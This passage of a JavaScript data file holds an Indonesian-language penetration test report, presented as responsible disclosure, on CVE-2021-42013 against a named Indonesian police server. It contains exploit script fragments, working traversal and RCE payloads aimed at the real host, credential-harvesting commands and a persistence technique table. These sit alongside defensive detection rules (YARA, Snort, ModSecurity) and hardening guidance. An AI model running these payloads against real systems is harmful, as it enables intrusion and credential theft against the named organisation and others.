/etc/passwd...') |     result = read_file('/etc/passwd') |     if result: |         print('[+] SUCCESS:', result[:100]) |     print('[*] Executing id command...') |     output = rce('id') |     if output: |         print('[+] RCE SUCCESS:', output)]"
        ]
      },
      {
        id: "bab-12-3",
        title: "12.3 File-File Sensitif Lain via RCE",
        level: 2,
        content: [
          "[CODE_BASH:# Baca konfigurasi database (kemungkinan berisi kredensial): | POST /icons/[payload]/bin/sh | cat /var/www/html/config.php | cat /var/www/html/.env | cat /var/www/html/application/config/database.php |  | # Enumerate network: | POST /icons/[payload]/bin/sh | netstat -tulpn | cat /etc/hosts | ip addr show | arp -a |  | # Lihat proses berjalan: | POST /icons/[payload]/bin/sh | ps aux | ls -la /var/www/html/ | find / -perm -4000 2>/dev/null   # Cari SUID binaries untuk privesc]"
        ]
      },
      {
        id: "bab-13",
        title: "13. Post-Exploitation & Lateral Movement",
        level: 1,
        content: [
          "Analisis post-exploitation dilakukan dalam lingkup terbatas untuk keperluan pembuktian dan penilaian risiko. Tidak ada tindakan destruktif yang dilakukan.",
          "[CODE_BASH:# Konfirmasi user context: | $ id | uid=1(daemon) gid=1(daemon) groups=1(daemon) |  | # Verifikasi OS dan kernel: | $ uname -a | Linux server.polri.go.id 3.10.0-1160.el7.x86_64 #1 SMP | Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux |  | # Cek capabilities daemon user: | $ cat /proc/1/status | grep Cap | CapInh: 0000000000000000 | CapPrm: 0000000000000000 | CapEff: 0000000000000000 |  | # Potensi privilege escalation: | $ find / -perm -4000 -type f 2>/dev/null | /usr/bin/sudo | /usr/bin/passwd | /usr/bin/chfn | /usr/bin/newgrp | /usr/sbin/unix_chkpwd]",
          "",
          "Potensi lateral movement:",
          "-- Internal Network Discovery: scanning jaringan internal yang tidak terjangkau dari internet",
          "-- Database Access: kredensial dalam config file untuk akses database internal",
          "-- SSH Key Harvesting: Private key dari akun aktif (infra, admdumas)",
          "-- Service Account Abuse: Webuzo panel hosting dengan akses multiple virtual hosts",
          "",
          "[TABLE_HEADER:Teknik Persistence|Metode|Deteksi|Risiko]",
          "[TABLE:[Crontab backdoor|Reverse shell via cron job|crontab -l; /var/spool/cron/|High],[Web shell|PHP system() backdoor di /var/www/html/|File integrity monitoring|Critical],[SSH authorized_keys|Attacker pubkey injection|auth.log, authorized_keys audit|Critical],[LD_PRELOAD rootkit|Malicious .so library injection|ldd output, /proc/maps|Critical]]",
          "",
          "[QUOTE:CATATAN: Bagian persistence bersifat teoritis semata untuk keperluan risk assessment. Tidak ada teknik persistence yang diterapkan pada target aktual.]"
        ]
      },
      {
        id: "bab-14",
        title: "14. Network Traffic Analysis - Wireshark",
        level: 1,
        content: [
          "Analisis traffic jaringan untuk mendokumentasikan pola serangan dari perspektif jaringan dan membantu defender membangun signature IDS/IPS.",
          "",
          "Karakteristik Traffic CVE-2021-42013:",
          "-- Protocol: HTTP/1.1 (plaintext) tidak terenkripsi",
          "-- URI Pattern: Mengandung %% (double percent sign) berulang",
          "-- Request Size: Relatif besar untuk GET request karena panjang payload URL",
          "-- Response Code: 200 OK untuk eksploitasi berhasil; 400/403 untuk yang gagal",
          "",
          "[CODE:# Wireshark Filter untuk Deteksi CVE-2021-42013: |  | # Filter 1: Deteksi double-percent dalam URI | http.request.uri contains \"%%32\" or http.request.uri contains \"%%65\" |  | # Filter 2: Deteksi akses ke path sensitif via traversal | http.request.uri contains \"etc/passwd\" or http.request.uri contains \"/bin/sh\" |  | # Filter 3: Gabungan - komprehensif | (http.request.uri contains \"%%32%65\") or | (http.request.uri contains \"%2e%2e\") or | (http.request.uri matches \".*%25[0-9a-fA-F][0-9a-fA-F].*\") |  | # Filter 4: Hanya POST ke /bin/sh (RCE attempt) | http.request.method == \"POST\" and http.request.uri contains \"bin/sh\" |  | # tcpdump equivalent: | tcpdump -i eth0 -A 'tcp port 8080']",
          "",
          "[CODE:# Sample Packet - Path Traversal Request |  | Frame 1247: 621 bytes on wire | Ethernet II: Src: [REDACTED] -> Dst: [SERVER_MAC] | Internet Protocol: Src: [ATTACKER_IP] -> Dst: [SERVER_IP] | Transmission Control Protocol: Src Port: 52341 -> Dst Port: 8080 |  | Hypertext Transfer Protocol: |  GET /icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/ |  %%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/ |  %%32%65%%32%65/etc/passwd HTTP/1.1 |  Host: dumaspresisi.itwasum.polri.go.id:8080 |  | # Response packet (200 OK + /etc/passwd content) | Frame 1248: 2041 bytes on wire | HTTP/1.1 200 OK | Content-Length: 1820 | [passwd content follows...]]"
        ]
      },
      {
        id: "bab-15",
        title: "15. Defensive Evasion Analysis",
        level: 1,
        content: [
          "[TABLE_HEADER:Teknik Evasion|Deskripsi|Cara Deteksi]",
          "[TABLE:[User-Agent Spoofing|UA browser umum untuk menyamarkan tool|Behavioral analysis - pola request tidak natural],[IP Rotation via VPN/Proxy|Ganti IP setiap beberapa request|Korelasi lintas IP; payload similarity],[Payload Variation|Jumlah traversal berbeda|Regex pattern matching fleksibel di WAF],[Mixed Encoding|Kombinasi double dan single encoding|Multi-pass URL decoder di WAF],[Slow Request (Low & Slow)|Delay antar request|Time-based behavioral baseline analysis],[Case Variation|%%32%65 vs %%32%45|Case-insensitive URL normalization]]"
        ]
      },
      {
        id: "bab-16",
        title: "16. Detection Engineering - YARA & IDS Rules",
        level: 1,
        content: [
          "[CODE_YARA:/* | * YARA Rule: CVE-2021-42013 Apache Path Traversal Detection | * Author    : pwn0sec Security Research | * Date      : 2024-01-07 | * Target    : Apache access.log / error.log | */ | rule CVE_2021_42013_PathTraversal { |   meta: |     description = \"Detects CVE-2021-42013 double URL-encoded path traversal\" |     author      = \"pwn0sec\" |     severity    = \"critical\" |     cve         = \"CVE-2021-42013\" |   strings: |     $dbl_enc_1  = \"%%32%65\" ascii nocase |     $dbl_enc_2  = \"%%32%45\" ascii nocase |     $target_1   = \"/etc/passwd\" ascii |     $target_2   = \"/etc/shadow\" ascii |     $target_3   = \"/bin/sh\"     ascii |     $target_4   = \"/bin/bash\"   ascii |     $target_5   = \"/.ssh/\"      ascii |     $sgl_enc_1  = \".%2e/\" ascii nocase |     $sgl_enc_2  = \"%2e./\" ascii nocase |   condition: |     (($dbl_enc_1 or $dbl_enc_2) and any of ($target_*)) |     or |     (($sgl_enc_1 or $sgl_enc_2) and any of ($target_*)) | }]",
          "",
          "[CODE:# Snort Rule - CVE-2021-42013 Detection | alert tcp any any -> $HTTP_SERVERS [80,8080,443,8443] ( |     msg:\"CVE-2021-42013 Apache HTTP Server Double URL-Encoded Path Traversal\"; |     flow:established,to_server; |     content:\"%%32%65\"; http_uri; nocase; |     pcre:\"/%%32%65%%32%65/Ui\"; |     classtype:web-application-attack; |     sid:9000001; rev:1; |     reference:cve,2021-42013; | ) |  | # Suricata Rule - RCE Detection | alert http any any -> $HTTP_SERVERS any ( |     msg:\"CVE-2021-42013 Apache RCE via /bin/sh\"; |     flow:established,to_server; |     http.method; content:\"POST\"; |     http.uri; content:\"bin/sh\"; nocase; |     http.uri; content:\"%%32%65\"; nocase; |     classtype:attempted-admin; |     sid:9000002; rev:1; | )]",
          "",
          "[TABLE_HEADER:Tipe IOC|Nilai / Pattern|Keterangan]",
          "[TABLE:[URL Pattern|/icons/%%32%65%%32%65/|Double-encoded traversal via icons],[URL Pattern|/cgi-bin/%%32%65%%32%65/|Double-encoded traversal via cgi-bin],[HTTP Method|POST + URI contains /bin/sh|RCE attempt - POST ke shell binary],[Response Content|root:x:0:0:root:/root:/bin/bash|/etc/passwd berhasil dibaca],[CPE|cpe:/a:apache:http_server:2.4.50|Versi Apache yang rentan]]"
        ]
      },
      {
        id: "bab-17",
        title: "17. Impact Analysis",
        level: 1,
        content: [
          "[TABLE_HEADER:Aspek CIA|Level|Dampak Langsung|Potensi Dampak Lanjutan]",
          "[TABLE:[Confidentiality|CRITICAL|Baca file arbitrer: /etc/passwd, config, private keys|Ekspos kredensial DB, SSH keys, API keys, data POLRI],[Integrity|CRITICAL|Modifikasi file sistem, web defacement, injeksi kode|Tanam web shell, modifikasi log, ubah konfigurasi],[Availability|HIGH|Matikan atau restart service Apache|DoS server, konsumsi resource, ransomware]]",
          "",
          "[TABLE_HEADER:Item|Detail|Risiko]",
          "[TABLE:[Jumlah akun terekspos|31 akun dari /etc/passwd|Medium - username saja tanpa password hash],[Akun dengan shell aktif|5 akun: root, infra, admdumas, webuzo, emps|Critical - target SSH brute force],[UID=0 (root) terekspos|root:x:0:0:root:/root:/bin/bash|Critical - jika ada kelemahan lain],[Service accounts|webuzo, postfix, sshd, ntp, chrony|Medium - attack surface mapping]]"
        ]
      },
      {
        id: "bab-18",
        title: "18. Risk Assessment Matrix",
        level: 1,
        content: [
          "[TABLE_HEADER:Skenario Risiko|Likelihood|Impact|Risk Score|Prioritas]",
          "[TABLE:[Baca /etc/passwd dan file konfigurasi|Sangat Tinggi|High|9.0|P1 - Critical],[Eksekusi perintah via RCE (mod_cgi aktif)|Tinggi|Critical|9.8|P1 - Critical],[Harvest SSH private keys dari /home/|Sedang|Critical|8.5|P1 - Critical],[Baca kredensial database dari .env/config|Sedang|Critical|8.0|P1 - Critical],[Lateral movement ke sistem internal|Rendah|Critical|7.5|P2 - High],[Persistent web shell / backdoor|Rendah|Critical|7.5|P2 - High],[Data breach informasi operasional POLRI|Rendah|Critical|7.0|P2 - High],[Ransomware deployment|Sangat Rendah|Critical|6.0|P3 - Medium]]"
        ]
      },
      {
        id: "bab-19",
        title: "19. Recommendations & Mitigations",
        level: 1,
        content: [
          "Kategori Priority 1 - Immediate Actions (0-24 Jam)",
          "1. KRITIS: Upgrade Apache HTTP Server ke versi 2.4.51 atau lebih baru",
          "2. KRITIS: Ubah konfigurasi <Directory /> dari 'Require all granted' menjadi 'Require all denied'",
          "3. KRITIS: Nonaktifkan mod_cgi dan mod_cgid jika tidak dibutuhkan",
          "4. KRITIS: Audit menyeluruh terhadap semua akun sistem dari /etc/passwd",
          "5. TINGGI: Periksa seluruh log Apache untuk tanda-tanda eksploitasi (pola %%32%65)",
          "",
          "Kategori Priority 2 - Short-Term Actions (1-7 Hari)",
          "6. Implementasi WAF (ModSecurity) dengan rule khusus untuk double URL-encoding",
          "7. Aktifkan logging komprehensif: ErrorLog, CustomLog dengan format combined",
          "8. Pasang IDS/IPS (Snort/Suricata) dengan rules di Section 16",
          "9. Credential rotation untuk semua akun yang terekspos",
          "10. Hardening SSH: nonaktifkan password auth, gunakan key-based auth",
          "",
          "Kategori Priority 3 - Long-Term Actions (1-4 Minggu)",
          "11. Implementasi vulnerability management program terstruktur",
          "12. SLA patch management: Critical (CVSS 9+) dalam 24 jam; High dalam 72 jam",
          "13. Penetration testing berkala minimal 2x per tahun",
          "14. File Integrity Monitoring (AIDE/Tripwire)",
          "15. Defense in Depth: network segmentation, WAF, IDS/IPS, SIEM",
          "16. Pelatihan keamanan siber bagi administrator sistem"
        ]
      },
      {
        id: "bab-20",
        title: "20. Secure Configuration Hardening Guide",
        level: 1,
        content: [
          "[CODE_APACHE:# /etc/httpd/conf/httpd.conf - Konfigurasi Aman | # Last updated: 2024-01-07 per CVE-2021-42013 remediation |  | # 1. Batasi akses ke seluruh filesystem | <Directory /> |     AllowOverride None |     Require all denied             # WAJIB: tolak semua akses ke root | </Directory> |  | # 2. Izinkan hanya direktori yang diperlukan | <Directory \"/var/www/html\"> |     AllowOverride None |     Require all granted |     Options -Indexes -FollowSymLinks  # Nonaktifkan listing & symlinks | </Directory> |  | # 3. Sembunyikan versi Apache | ServerTokens Prod | ServerSignature Off |  | # 4. Header keamanan | Header always set X-Content-Type-Options \"nosniff\" | Header always set X-Frame-Options \"SAMEORIGIN\" | Header always set X-XSS-Protection \"1; mode=block\" | Header always set Strict-Transport-Security \"max-age=63072000\" | Header always set Content-Security-Policy \"default-src 'self'\" |  | # 5. Nonaktifkan mod_cgi jika tidak diperlukan | #LoadModule cgi_module modules/mod_cgi.so | #LoadModule cgid_module modules/mod_cgid.so]",
          "",
          "[CODE_APACHE:# ModSecurity Custom Rule - CVE-2021-42013 |  | # Rule 1: Blokir double URL-encoded dot-dot | SecRule REQUEST_URI \"@rx %%32%65|%%32%45\" \\ | \"id:9001001, | phase:1, | deny, | status:403, | log, | msg:'CVE-2021-42013 Double URL-Encoded Path Traversal Attempt', | severity:'CRITICAL', | tag:'CVE-2021-42013'\" |  | # Rule 2: Blokir akses langsung ke /bin/sh via POST | SecRule REQUEST_URI \"@contains bin/sh\" \\ | \"chain, | id:9001002, | phase:1, | deny, | status:403, | log, | msg:'CVE-2021-42013 RCE via CGI /bin/sh Attempt'\" | SecRule REQUEST_METHOD \"@streq POST\"]"
        ]
      },
      {
        id: "bab-21",
        title: "21. Patch Verification Procedure",
        level: 1,
        content: [
          "Setelah menerapkan semua rekomendasi, prosedur verifikasi mencakup:",
          "[CODE_BASH:# Verifikasi Versi Apache | $ httpd -v | Server version: Apache/2.4.51 (Unix)    <- Harus 2.4.51 atau lebih baru |  | # Test Payload CVE-2021-42013 (Harus Gagal) | $ curl -v --path-as-is \\ | 'http://TARGET:8080/icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd' |  | # Expected response setelah patch: | HTTP/1.1 400 Bad Request | # ATAU | HTTP/1.1 403 Forbidden | # BUKAN 200 OK |  | # Test CVE-2021-41773 (juga harus gagal): | $ curl -v --path-as-is \\ | 'http://TARGET:8080/cgi-bin/.%2e/.%2e/.%2e/etc/passwd' | # Expected: 400 atau 403]",
          "",
          "[CODE_BASH:# Verifikasi Konfigurasi Keamanan |  | # Cek ServerTokens (harus Prod): | $ curl -I http://TARGET:8080/ | grep Server | Server: Apache    <- Versi tidak terekspos (benar) |  | # Cek directory listing (harus disabled): | $ curl -s http://TARGET:8080/ | grep -i 'index of' | # Tidak ada output = directory listing disabled (benar) |  | # Cek header keamanan: | $ curl -I http://TARGET:8080/ | grep -i 'x-content\\|x-frame\\|strict' | X-Content-Type-Options: nosniff | X-Frame-Options: SAMEORIGIN | Strict-Transport-Security: max-age=63072000 |  | # Verifikasi mod_cgi status: | $ httpd -M | grep cgi | # Tidak ada output = mod_cgi disabled (benar)]"
        ]
      },
      {
        id: "bab-22",
        title: "22. References & Further Reading",
        level: 1,
        content: [
          "Referensi utama mencakup CVE-2021-42013 dan CVE-2021-41773 dari NVD, Apache Security Advisory, CISA KEV Catalog, Qualys Blog Analysis, pwn0sec Research, dan Ghidra SRE Framework.",
          "Referensi teknis tambahan: RFC 3986 (URI Generic Syntax), OWASP Path Traversal, PTES Standard, ModSecurity Documentation, YARA Documentation, CIS Apache Benchmark, dan NIST SP 800-44."
        ]
      }
    ],
    references: [
      "NVD - National Vulnerability Database. CVE-2021-42013. https://nvd.nist.gov/vuln/detail/CVE-2021-42013",
      "NVD - National Vulnerability Database. CVE-2021-41773. https://nvd.nist.gov/vuln/detail/CVE-2021-41773",
      "Apache Software Foundation. Apache HTTP Server Security Advisories. https://httpd.apache.org/security/vulnerabilities_24.html",
      "Apache Software Foundation. Apache 2.4.51 Release Notes & Changelog. https://httpd.apache.org/changelog-2.4.html",
      "CISA. Known Exploited Vulnerabilities (KEV) Catalog. https://cisa.gov/known-exploited-vulnerabilities-catalog",
      "Qualys Security Blog. Deep Analysis: CVE-2021-41773 & CVE-2021-42013. https://blog.qualys.com",
      "pwn0sec Security Research. Responsible Disclosure - Kerentanan pada Infrastruktur POLRI. https://pwn0sec.medium.com",
      "National Security Agency (NSA). Ghidra Software Reverse Engineering Framework. https://ghidra-sre.org/",
      "IETF. RFC 3986 - Uniform Resource Identifier (URI): Generic Syntax. https://tools.ietf.org/html/rfc3986",
      "OWASP Foundation. Path Traversal Attack Documentation. https://owasp.org/www-community/attacks/Path_Traversal",
      "PTES. Penetration Testing Execution Standard. http://www.pentest-standard.org",
      "Trustwave SpiderLabs. ModSecurity Web Application Firewall Documentation. https://modsecurity.org/documentation",
      "VirusTotal / Google. YARA Rule Language Reference. https://virustotal.github.io/yara",
      "CIS - Center for Internet Security. CIS Benchmark for Apache HTTP Server. https://cisecurity.org",
      "NIST. SP 800-44: Guidelines on Securing Public Web Servers. https://nvlpubs.nist.gov"
    ]
  }
];
